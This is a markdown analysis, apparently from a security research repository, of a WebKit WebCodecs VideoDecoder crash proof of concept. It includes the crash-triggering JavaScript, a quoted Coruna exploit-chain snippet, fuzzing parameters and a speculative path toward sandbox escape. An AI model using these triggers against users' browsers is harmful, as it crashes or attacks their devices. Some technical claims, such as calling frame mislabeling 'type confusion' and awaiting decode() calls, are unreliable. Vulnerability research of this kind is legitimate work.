# WebCodecs VideoDecoder Exploitation Analysis

## Overview

This document analyzes the WebCodecs VideoDecoder crash PoC and explains how it relates to the broader WebKit exploitation techniques used in the Coruna exploit chain.

## The WebCodecs PoC Breakdown

The provided code (`webcodecs_decoder_poc.html`) demonstrates a **null pointer dereference** vulnerability in WebKit's WebCodecs implementation through several techniques:

### 1. Type Confusion (Key Technique)

```javascript
videoDecoder.decode(new EncodedVideoChunk({
    type: chunk.type === "key" ? "delta" : "key",  // FLIPPED!
    timestamp: chunk.timestamp,
    data: buf
}))
```

**Why this works:**
- **Keyframe (I-frame)**: Self-contained, doesn't depend on previous frames
- **Delta frame (P/B-frame)**: Depends on reference frames for decoding
- When a delta frame is mislabeled as key, the decoder tries to decode it without proper reference frames
- This causes null pointer dereferences in the decoder's frame reference table

### 2. Empty Data Injection

```javascript
new EncodedVideoChunk({
    type: "key",
    timestamp: 1000000,
    data: new Uint8Array(0)  // Empty data
})
```

**Vulnerability:** The decoder expects valid VP8/VP9/H.264 headers in keyframe data. Empty data causes parsing failures and null dereferences.

### 3. Decoder State Machine Corruption

The PoC deliberately corrupts the decoder state by:
1. Configuring the decoder with valid configuration
2. Feeding it malformed chunks
3. The decoder's internal state machine gets confused about frame dependencies

## Relation to Coruna Exploit Chain

### Parallel Exploitation Techniques

| Technique | Coruna (WASM) | WebCodecs PoC |
|-----------|--------------|---------------|
| **Type Confusion** | JIT type profiling confusion | Key/delta frame mislabeling |
| **Null Dereference** | Corrupted WASM instance pointers | Empty decoder input buffers |
| **Memory Corruption** | Fake JSObject creation | Decoder state corruption |
| **Privilege Escalation** | PAC bypass → arbitrary code execution | Potential GPU/media process escape |

### Stage 1 Comparison

**Coruna Stage 1** (`Stage1_16.6_17.2.1_cassowary.js`):
```javascript
// JIT type confusion via megamorphic calls
// Creates fake objects to gain read/write primitives
pm.fc = { lo: 1, co: 2 };
pm.fa = [1.1, pm.fc];
// ... type confusion leads to arbitrary memory read/write
```

**WebCodecs Equivalent**:
```javascript
// Decoder type confusion via mislabeled frames
// Creates decoder state confusion to trigger null deref
videoDecoder.decode(new EncodedVideoChunk({
    type: "key",  // Wrong type for delta data
    data: deltaFrameData
}));
```

### Key Difference: Attack Surface

| Aspect | WASM Exploit | WebCodecs Exploit |
|--------|-------------|-------------------|
| **Process** | Main JavaScript thread | Media/GPU process (often separate) |
| **Sandbox** | Same sandbox as JS | May have different sandbox profile |
| **Code Execution** | Direct JIT shellcode | May require additional sandbox escape |
| **Stability** | Reliable (deterministic) | May vary based on hardware decoder |

## Decoder Exploitation Deep Dive

### WebCodecs Architecture in WebKit

```
JavaScript (Main Thread)
    ↓
WebCodecs API (IPC)
    ↓
Media Process / GPU Process
    ↓
Hardware Decoder (VideoToolbox/VA-API)
```

### Vulnerability Classes in Video Decoders

1. **Parsing Vulnerabilities**
   - Malformed NAL units (H.264/H.265)
   - Invalid VPS/SPS/PPS parameters
   - Out-of-bounds slice data

2. **State Machine Bugs**
   - DPB (Decoded Picture Buffer) mismanagement
   - Reference frame list corruption
   - Frame ordering violations

3. **Memory Safety Issues**
   - Use-after-free in frame references
   - Buffer overflow in reconstruction buffers
   - Integer overflow in dimension calculations

### The Empty Buffer Pattern

```javascript
// Original PoC - intentionally minimal
const vchunk = new EncodedVideoChunk({
    type: "key",
    timestamp: 1000000,
    data: new Uint8Array(0)  // Zero bytes
});
videoDecoder.decode(vchunk);
```

**What happens internally:**
1. WebKit creates a `WebCore::EncodedVideoChunk` from the JS object
2. Passes to `VideoDecoder::decode()` which queues the chunk
3. Decoder thread picks up the chunk and attempts to parse
4. VP8 parser expects at least a frame tag (3-10 bytes)
5. Empty data causes early return or null dereference in bitstream parsing

### Enhanced Exploitation Techniques

#### 1. Race Condition Exploitation

```javascript
// Decode multiple conflicting chunks simultaneously
const promises = [];
for (let i = 0; i < 100; i++) {
    promises.push(videoDecoder.decode(createCorruptedChunk(i)));
}
await Promise.all(promises);
```

#### 2. Timestamp Manipulation

```javascript
// Non-monotonic timestamps can confuse frame reordering
videoDecoder.decode(new EncodedVideoChunk({
    type: "delta",
    timestamp: -999999999,  // Negative timestamp
    data: frameData
}));
```

#### 3. Configuration Confusion

```javascript
// Rapid reconfiguration can leave decoder in bad state
videoDecoder.configure({ codec: "vp8", width: 320, height: 240 });
videoDecoder.configure({ codec: "vp9", width: 640, height: 480 });
// Old frames may still be in flight
```

## Debugging and Analysis

### WebKit Logging

Enable media logging in WebKit:
```bash
export WEBKIT_DEBUG="Media=debug,WebCodecs=debug"
```

### Crash Analysis

When the PoC triggers a crash, check for:

1. **Crash location**: `libwebrtc.dylib`, `VideoToolbox`, or WebKit media code
2. **Register state**: Look for null/zero values in address registers
3. **Stack trace**: Identify the decoder pipeline path

### Common Crash Signatures

```
EXC_BAD_ACCESS (code=1, address=0x0)
→ Null pointer dereference in decoder

EXC_BAD_ACCESS (code=1, address=0x10)
→ Null struct pointer + offset access

EXC_BAD_ACCESS (code=2, address=...)
→ Data abort (may indicate UAF or OOB)
```

## Integration with Exploit Chains

### Potential Exploitation Path

```
WebCodecs Crash → Media Process Compromise → IPC Hijacking → 
Sandbox Escape → Kernel Exploitation
```

### Why This Matters for iOS Exploitation

1. **Separate Process**: Media decoding often runs in a separate process with different sandbox rules
2. **Hardware Access**: Video decoders interact with hardware (IOMMU/TrustZone)
3. **Alternative Path**: If WASM JIT is disabled (Lockdown Mode), media APIs may still be available

### Comparison to Coruna's Approach

The Coruna exploit chain uses:
- **Stage 1**: WASM JIT type confusion → Memory read/write primitives
- **Stage 2**: PAC bypass (for A12+ devices)
- **Stage 3**: Sandbox escape via dyld/Mach-O manipulation

A WebCodecs-based chain might use:
- **Stage 1**: VideoDecoder type confusion → Media process crash/control
- **Stage 2**: IPC manipulation to escape media sandbox
- **Stage 3**: Same as Coruna (kernel exploitation)

## Practical Debugging Tips

### 1. Minimal Reproduction

```javascript
// Absolute minimal reproducer
const d = new VideoDecoder({
    output: () => {},
    error: () => {}
});
d.configure({ codec: "vp8", width: 1, height: 1 });
d.decode(new EncodedVideoChunk({
    type: "key",
    timestamp: 0,
    data: new Uint8Array(0)
}));
```

### 2. Fuzzing Strategy

```javascript
// Systematic parameter fuzzing
const fuzzParams = {
    codecs: ['vp8', 'vp9', 'avc1.42001E', 'avc1.640028'],
    dimensions: [1, 16, 320, 4096, 65535],
    timestamps: [-1, 0, 1, 2**31, 2**53],
    dataSizes: [0, 1, 10, 100, 10000]
};
```

### 3. State Inspection

```javascript
// Monitor decoder state
const originalDecode = videoDecoder.decode.bind(videoDecoder);
videoDecoder.decode = function(chunk) {
    console.log(`Decoding: type=${chunk.type}, size=${chunk.byteLength}`);
    return originalDecode(chunk);
};
```

## Conclusion

The WebCodecs VideoDecoder PoC demonstrates a **different class of vulnerabilities** compared to the WASM-based exploits in the Coruna toolkit:

- **Target**: Media pipeline instead of JIT compiler
- **Mechanism**: Type confusion via metadata (frame type) rather than type profiling
- **Goal**: Null dereference in privileged decoder code

This technique is valuable for:
1. Understanding decoder exploitation patterns
2. Alternative entry points when JIT is disabled
3. Media process sandbox escape research

The core insight is that **type confusion is a universal vulnerability pattern** - whether in JavaScript type profiling or video frame metadata handling.

## References

- WebCodecs Specification: https://w3c.github.io/webcodecs/
- WebKit WebCodecs Implementation: Source/WebCore/Modules/webcodecs/
- VP8 Bitstream Specification: https://datatracker.ietf.org/doc/html/rfc6386
- Coruna Analysis: See ANALYSIS.md in this repository
